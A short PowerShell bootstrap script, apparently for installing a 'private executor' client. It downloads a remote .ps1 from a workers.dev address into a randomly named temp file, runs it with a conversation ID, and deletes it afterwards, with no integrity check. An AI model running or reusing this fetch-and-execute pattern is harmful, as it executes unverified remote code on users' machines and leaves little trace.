param([string]$ConversationId = '', [switch]$SkipSetup)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$installer = Join-Path $env:TEMP ([IO.Path]::GetRandomFileName() + '.ps1')
try {
    Invoke-WebRequest -UseBasicParsing -Uri 'https://wb-private-executor.cnproduct.workers.dev/client/install.ps1' -OutFile $installer
    & $installer -ConversationId $ConversationId -SkipSetup:$SkipSetup
} finally {
    Remove-Item -LiteralPath $installer -Force -ErrorAction SilentlyContinue
}
